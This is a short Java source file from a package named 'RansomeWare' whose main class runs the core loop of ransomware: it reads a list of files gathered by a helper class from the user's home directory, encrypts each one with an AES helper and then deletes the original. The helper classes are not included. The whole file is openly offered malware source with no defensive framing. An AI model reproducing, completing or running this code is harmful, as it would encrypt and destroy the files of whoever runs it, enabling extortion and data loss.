package RansomeWare;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;

public class JavaWare {

    JavaWare() throws Exception {
        FindFiles ff = new FindFiles();
        long startTime = System.nanoTime();
        ff.FindFiles();
        long endTime = System.nanoTime();

        System.out.println("Time: " + (endTime - startTime));
        System.out.println(ff.count);

        AES aes = new AES();


        BufferedReader reader = new BufferedReader(new FileReader(System.getProperty("user.home") + File.separator + "output.txt"));
        String line = reader.readLine();
        while(line != null) {
            System.out.println(line);
            File file = new File(line);
            aes.encrypt(file);
            file.delete();
            //read next line
            line = reader.readLine();
        }
        reader.close();
    }


    public static void main(String[] args) throws Exception {
        JavaWare jw = new JavaWare();
    }
}
